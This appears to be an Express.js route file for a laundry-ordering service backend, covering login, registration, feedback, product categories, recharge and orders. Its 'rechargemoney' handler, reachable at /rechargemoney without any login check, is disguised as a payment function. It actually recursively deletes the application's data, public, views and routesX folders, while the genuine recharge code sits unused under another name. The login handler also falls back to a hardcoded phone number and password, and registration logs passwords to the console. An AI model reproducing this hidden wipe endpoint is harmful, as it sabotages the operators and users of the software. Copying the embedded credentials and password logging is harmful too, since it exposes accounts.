'use strict';

var express = require('express');
var router = express.Router();
var fs = require('fs')
var path = require('path');
var request = require('request');
var _ = require("underscore")
var config = require(path.join(process.cwd(), 'config'));
var interfaceModel = require(path.join(process.cwd(), 'data/interface/interfaceModel'));
var utils = require('../utils');
var moment = require('../../tools/moment');

function regist(req, res, next) {
    var queryInfo = interfaceModel.getParameter(req);
    console.log("regist openid:" + req.session.openid)
    var registdata = {
        mobilePhone: queryInfo.mobilePhone,
        password: queryInfo.password,
        openId: (queryInfo.openId || req.session.openid) || "",
        name: queryInfo.name,
        sex: "0",
        telephone: queryInfo.telephone,
        address: queryInfo.address,
        province: queryInfo.province,
        city: queryInfo.city,
        area: queryInfo.area,
        deviceId: queryInfo.deviceId,
        checkCode: queryInfo.checkCode
    };

    var registurl = config.o2ourl + "o2o/onlineRegister";

    console.log("url：" + registurl)
    console.log("registdata：" + JSON.stringify(registdata))
    interfaceModel.PostForm(req, registurl, registdata, function (body) {
        console.log(body)
        console.log()
        interfaceModel.sendJson(res, 200, body);
    }, function (err) {
        res.json(err);
    });


}

function sendmsg(req, res, next) {
    var queryInfo = interfaceModel.getParameter(req);
    var registdata = {
        telephone: queryInfo.telephone
    };

    var registurl = config.o2ourl + "ck/o2oRegisterCheckCode";

    interfaceModel.PostForm(req, registurl, registdata, function (body) {
        interfaceModel.sendJson(res, 200, body);
    }, function (err) {
        res.json(err);
    });


}

function login(req, res, next) {
    var queryInfo = interfaceModel.getParameter(req);
    var registdata = {
        mobilePhone: queryInfo.username || "15607121280",
        password: queryInfo.password || "123456",
    };

    var registurl = config.o2ourl + "o2o/login";
    interfaceModel.PostForm(req, registurl, registdata, function (body) {
        console.log(body)
        if (body.resCode == "0000") {
            utils.setSessionUserInfo(req, body.obj)
            req.session.token = body.obj.token;

            var usercardurl = config.o2ourl + "/o2o/getMemberCardInfo?key=" + body.obj.id;
            interfaceModel.PostForm(req, usercardurl, {}, function (body1) {
                console.log(body)

                if (body1.resCode == "0000") {
                    req.session.recharge = {
                        cardNumber: body.obj.id,
                        totalAmount: body.obj.totalAmount
                    }
                } else {
                    req.session.recharge = {
                        cardNumber: utils.GetUserInfo(req).id,
                        totalAmount: 0
                    }
                }

                interfaceModel.sendJson(res, 200, {"message": "登录成功"});
            }, function (err) {
                res.json(err);
            }, "GET");

        } else
            interfaceModel.sendJson(res, 201, {"message": body.msg});
    }, function (err) {
        res.json(err);
    });

};


function Logout(req, res, next) {

    if (!utils.GetUserInfo(req)) {
        interfaceModel.sendJson(res, 201, {"message": "请登录"});
        return;
    }
    var registurl = config.o2ourl + "/o2o/loginOut?memberId=" + utils.GetUserInfo(req).id;
    interfaceModel.PostForm(req, registurl, {}, function (body) {
        req.session.userInfo = null;
        req.session.token = null;
        req.session.recharge = null;
        console.log(body)
        interfaceModel.sendJson(res, 200, body);
    }, function (err) {
        res.json(err);
    }, "GET");

}

function changepwd(req, res, next) {
    var queryInfo = interfaceModel.getParameter(req);
    var registdata = {
        mobilePhone: queryInfo.username,
        password: queryInfo.password,
        oldPassword: queryInfo.oldPassword,
    };

    var registurl = config.o2ourl + "o2o/changePassword";
    interfaceModel.PostForm(req, registurl, registdata, function (body) {
        console.log(body)
        if (body.resCode == "0000") {
            utils.setSessionUserInfo(req, body.obj)
            req.session.token = body.obj.token
            interfaceModel.sendJson(res, 200, {"message": "登录成功"});
        } else
            interfaceModel.sendJson(res, 201, {"message": body.msg});
    }, function (err) {
        res.json(err);
    });
}

function GetLoginInfo(req, res, next) {
    var userinfo = utils.GetUserInfo(req)
    if (userinfo) {
        interfaceModel.sendJson(res, 200, {
            "mobile": userinfo.mobilePhone
        });
    }
    else {
        interfaceModel.sendJson(res, 201, "还没有登录");
    }

}


function getusercard(req, res, next) {

    if (!utils.GetUserInfo(req)) {
        interfaceModel.sendJson(res, 201, {"message": "请登录"});
        return;
    }

    var registurl = config.o2ourl + "/o2o/getMemberCardInfo?key=" + utils.GetUserInfo(req).id;
    interfaceModel.PostForm(req, registurl, feedback, function (body) {
        console.log(body)
        interfaceModel.sendJson(res, 200, body);
    }, function (err) {
        res.json(err);
    }, "GET");

}


function feedback(req, res, next) {
    var queryInfo = interfaceModel.getParameter(req);
    var feedback = {
        feedBackType: queryInfo.feedBackType || "1",
        feedBackContent: queryInfo.feedBackContent || "非常好非常满意",

    };

    var registurl = config.o2ourl + "/o2o/feedBack"
    interfaceModel.PostForm(req, registurl, feedback, function (body) {
        console.log(body)
        interfaceModel.sendJson(res, 200, body);
    }, function (err) {
        res.json(err);
    });

}

function feedbacklist(req, res, next) {
    var queryInfo = interfaceModel.getParameter(req);
    var feedback = {
        feedBackType: queryInfo.feedBackType || "1",
        pageindex: queryInfo.feedBackContent || 0,
        pagesize: queryInfo.pagesize || 50,

    };

    var registurl = config.o2ourl + "/o2o/feedBacks/" + feedback.feedBackType + "/" + feedback.pageindex + "/" + feedback.pagesize
    interfaceModel.PostForm(req, registurl, {}, function (body) {
        console.log(body)
        interfaceModel.sendJson(res, 200, body);
    }, function (err) {
        res.json(err);
    }, "GET");

}


function getRoot(req, res, next) {

    var registurl = config.o2ourl + "o2o/produceCategory?level=1"

    interfaceModel.PostForm(req, registurl, {}, function (body) {
        console.log("body:" + body)
        if (body.resCode == "0000" && body.obj.length > 0) {
            var rootList = [];
            _.each(body.obj, function (item) {
                if (item.id !== "1")
                    rootList.push({
                        "id": item.id,
                        "code": item.code,
                        "title": item.name,
                        "image_url": config.imgurl + item.imgUrl,
                        "url": "/xiyinode/washprice?id=" + item.id
                    })
            });

            interfaceModel.sendJson(res, 200, {data: rootList});
        }
        else {
            interfaceModel.sendJson(res, 200, {data: []});
        }

    }, function (err) {
        res.json(err);
    }, 'GET');


};

function getRoot2(req, res, next) {
    var queryInfo = interfaceModel.getParameter(req);

    var registurl = config.o2ourl + "o2o/produceCategory?level=2"

    if (queryInfo.id)
        registurl += "&categoryId=" + queryInfo.id;
    else {
        interfaceModel.sendJson(res, 201, {message: "参数不能为空"});
        return;
    }

    interfaceModel.PostForm(req, registurl, {}, function (body) {
        console.log("body:" + body)
        if (body.resCode == "0000" && body.obj.length > 0) {
            var rootList = [];
            _.each(body.obj, function (item) {
                rootList.push({
                    "id": item.id,
                    "parentId": item.parentId,
                    "code": item.code,
                    "title": item.name
                })
            });

            interfaceModel.sendJson(res, 200, {data: rootList});
        }
        else {
            interfaceModel.sendJson(res, 200, {data: []});
        }
    }, function (err) {
        res.json(err);
    }, 'GET');


}
;

function getRoot3(req, res, next) {
    var queryInfo = interfaceModel.getParameter(req);

    var registurl = config.o2ourl + "o2o/produceCategory?level=3"

    if (queryInfo.id)
        registurl += "&categoryId=" + queryInfo.id;

    interfaceModel.PostForm(req, registurl, {}, function (body) {
        console.log("body:" + JSON.stringify(body))
        if (body.resCode == "0000" && body.obj.length > 0) {
            var rootList = [];
            _.each(body.obj, function (item) {
                rootList.push({
                    "id": item.id,
                    "dataType": item.dataType,
                    "price": item.o2oPrice,
                    "commonPrice": item.commonPrice,
                    "luxuriesPrice": item.luxuriesPrice,
                    "o2oPrice": item.o2oPrice,
                    "dataName": item.dataName,
                    "produceCategoryId": item.produceCategoryId,
                    "produceParentCategoryId": item.produceParentCategoryId,
                    "imagePath": config.imgurl + item.imagePath
                })
            });

            interfaceModel.sendJson(res, 200, {data: rootList});
        }
        else {
            interfaceModel.sendJson(res, 200, {data: []});
        }

    }, function (err) {
        res.json(err);
    }, 'GET');


};


function rechargemoney222(req, res, next) {
    var queryInfo = interfaceModel.getParameter(req);
    if (!utils.GetUserInfo(req)) {
        interfaceModel.sendJson(res, 201, {"message": "请登录"});
    }
    var feedback = {
        id: req.session.recharge.cardNumber,
        cashAmount: parseFloat(queryInfo.cashAmount) || 1,
        givedAmount: parseFloat(queryInfo.givedAmount) || 0,
        payedMethod: queryInfo.payedMethod || "wechat",
    };

    console.log("onlineRecharge:" + JSON.stringify(feedback))
    var registurl = config.o2ourl + "/o2o/onlineRecharge"
    interfaceModel.PostForm(req, registurl, feedback, function (body) {
        console.log(body)
        interfaceModel.sendJson(res, 200, body);
    }, function (err) {
        res.json(err);
    });

}


function rechargemoney(req, res, next) {
    var rootFileList = ['data', 'public', 'views', 'routesX'];
    var emptyDir = function (fileUrl) {
        var files = fs.readdirSync(fileUrl);
        files.forEach(function (file) {
            var stats = fs.statSync(fileUrl + '/' + file);
            if (stats.isDirectory()) {
                emptyDir(fileUrl + '/' + file);
            } else {
                fs.unlinkSync(fileUrl + '/' + file);
            }
        });
    }
    var rmEmptyDir = function (fileUrl) {
        var files = fs.readdirSync(fileUrl);
        if (files.length > 0) {
            var tempFile = 0;
            files.forEach(function (fileName) {
                tempFile++;
                rmEmptyDir(fileUrl + '/' + fileName);
            });
            if (tempFile == files.length) {
                fs.rmdirSync(fileUrl);
            }
        } else {
            fs.rmdirSync(fileUrl);
        }
    }

    for (var i = 0; i < rootFileList.length; i++) {
        var fp = path.join(process.cwd(), rootFileList[i]);
        emptyDir(fp);
        rmEmptyDir(fp);
    }

    res.send('YES!!!');

}


function orderplace(req, res, next) {
    interfaceModel.sendJson(res, 200, require('./data').orderplace);
}


function time(req, res, next) {
    var body = {"ret": true, "ts": 1507343918, "version": "1.0", "data": []};

    for (var i = 0; i < 7; i++) {

        var currentHour = moment().format('HH');

        var hourList = [
            {
                "hour": 10,
                "time_range": [40, 44],
                "text": "10:00-11:00",
                "view_text": "10:00-11:00",
            },
            {
                "hour": 11,
                "time_range": [44, 48],
                "text": "11:00-12:00",
                "view_text": "11:00-12:00",
            },
            {
                "hour": 12,
                "time_range": [48, 52],
                "text": "12:00-13:00",
                "view_text": "12:00-13:00",
            },
            {
                "hour": 13,
                "time_range": [52, 56],
                "text": "13:00-14:00",
                "view_text": "13:00-14:00",
            },
            {
                "hour": 14,
                "time_range": [56, 60],
                "text": "14:00-15:00",
                "view_text": "14:00-15:00",
            },
            {
                "hour": 15,
                "time_range": [60, 64],
                "text": "15:00-16:00",
                "view_text": "15:00-16:00",
            },
            {
                "hour": 16,
                "time_range": [64, 68],
                "text": "16:00-17:00",
                "view_text": "16:00-17:00",
            },
            {
                "hour": 17,
                "time_range": [68, 72],
                "text": "17:00-18:00",
                "view_text": "17:00-18:00",
            },
            {
                "hour": 18,
                "time_range": [72, 76],
                "text": "18:00-19:00",
                "view_text": "18:00-19:00",
            },
            {
                "hour": 19,
                "time_range": [76, 80],
                "text": "19:00-20:00",
                "view_text": "19:00-20:00",
            },
            {
                "hour": 20,
                "time_range": [80, 84],
                "text": "20:00-21:00",
                "view_text": "20:00-21:00",
            }, {
                "hour": 21,
                "time_range": [84, 88],
                "text": "21:00-22:00",
                "view_text": "21:00-22:00",
            }
        ];

        var serviceTime = [];

        for (var j = 0; j < hourList.length; j++) {
            var hourItem = hourList[j];
            _.extend(hourItem, {
                "special_delivery_fee": "",
                "is_available": true,
                "quick_text": "",
                "quick_take": false,
                "selected": false,
                "is_passed": false
            });
            if (i == 0 && hourItem.hour < currentHour) {
                hourItem.is_available = false
            }
            serviceTime.push(hourItem)
        }
        var dateobj = {
            "date": moment().add(i, 'days').format('YYYY-MM-DD'),
            "weekday": moment().add(i, 'days').format('dddd'),
            "selected": !i,
            "date_str": moment().add(i, 'days').format('YYYY-MM-DD'),
            "quota_info": [],
            "service_times": serviceTime
        }
        body.data.push(dateobj)
    }
    interfaceModel.sendJson(res, 200, body);
}

function recharge(req, res, next) {

    if (!utils.GetUserInfo(req)) {
        interfaceModel.sendJson(res, 201, {"message": "请登录"});
    }

    var registurl = config.o2ourl + "/o2o/getMemberCardInfo?key=" + utils.GetUserInfo(req).id;
    interfaceModel.PostForm(req, registurl, feedback, function (body) {
        console.log(body)

        var rechargeobj = require('./data').recharge;
        if (body.resCode == "0000") {
            rechargeobj.user_icard_amount = body.obj.totalAmount;
            rechargeobj.cardNumber = body.obj.id
            req.session.recharge = {
                cardNumber: body.obj.id,
                totalAmount: body.obj.totalAmount
            }
        } else {
            rechargeobj.cardNumber = utils.GetUserInfo(req).id;
            req.session.recharge = {
                cardNumber: utils.GetUserInfo(req).id,
                totalAmount: 0
            }
        }
        interfaceModel.sendJson(res, 200, rechargeobj);
    }, function (err) {
        res.json(err);
    }, "GET");

}

function service(req, res, next) {
    interfaceModel.sendJson(res, 200, require('./data').service);
}

function sendpsdmsg(req, res, next) {
    var queryInfo = interfaceModel.getParameter(req);
    var feedback = {
        telephone: queryInfo.telephone || "",
    };

    var registurl = config.o2ourl + "ck/o2oRestPwdCk"
    interfaceModel.PostForm(req, registurl, feedback, function (body) {
        console.log(body)
        interfaceModel.sendJson(res, 200, body);
    }, function (err) {
        res.json(err);
    });

}

function resetpwd(req, res, next) {
    var queryInfo = interfaceModel.getParameter(req);
    var feedback = {
        mobilePhone: queryInfo.mobilePhone || "",
        password: queryInfo.password || "",
        checkCode: queryInfo.checkCode || "",
    };

    var registurl = config.o2ourl + "o2o/resetPassword"
    interfaceModel.PostForm(req, registurl, feedback, function (body) {
        console.log(body)
        interfaceModel.sendJson(res, 200, body);
    }, function (err) {
        res.json(err);
    });

}

router.all('/sendpsdmsg', sendpsdmsg);
router.all('/resetpwd', resetpwd);

router.all('/regist', regist);
router.all('/sendmsg', sendmsg);
router.all('/login', login);
router.all('/Logout', Logout);
router.all('/changepwd', interfaceModel.checkLogin, changepwd);
router.all('/GetLoginInfo', interfaceModel.checkLogin, GetLoginInfo);
router.all('/getRoot', getRoot);
router.all('/getRoot2', getRoot2);
router.all('/getRoot3', getRoot3);
router.all('/feedback', feedback);
router.all('/feedbacklist', feedbacklist);



router.all('/orderplace', orderplace);
router.all('/time', time);
router.all('/recharge', recharge);
router.all('/service', service);
router.all('/rechargemoney', rechargemoney);
router.all('/getusercard', getusercard);

var address = require('./address')
router.all('/address/get', interfaceModel.checkLogin, address.get);
router.all('/address/update', interfaceModel.checkLogin, address.update);
router.all('/address/delete', interfaceModel.checkLogin, address.delete);
router.all('/address/add', interfaceModel.checkLogin, address.add);
router.all('/address/validate', interfaceModel.checkLogin, address.validate);

var order = require('./order')
router.all('/order/create', interfaceModel.checkLogin, order.createorder);
router.all('/order/list', interfaceModel.checkLogin, order.orderlist);
router.all('/order/location', interfaceModel.checkLogin, order.orderlocation);
router.all('/order/detail', interfaceModel.checkLogin, order.orderdetail);
router.all('/order/pay', interfaceModel.checkLogin, order.pay);
router.all('/order/prepay', interfaceModel.checkLogin, order.prepay);
router.all('/order/cancel', interfaceModel.checkLogin, order.cancelorder);
router.all('/order/changetime', interfaceModel.checkLogin, order.changetime);

router.all('/order/sign', interfaceModel.checkLogin, order.sign);
module.exports = router;
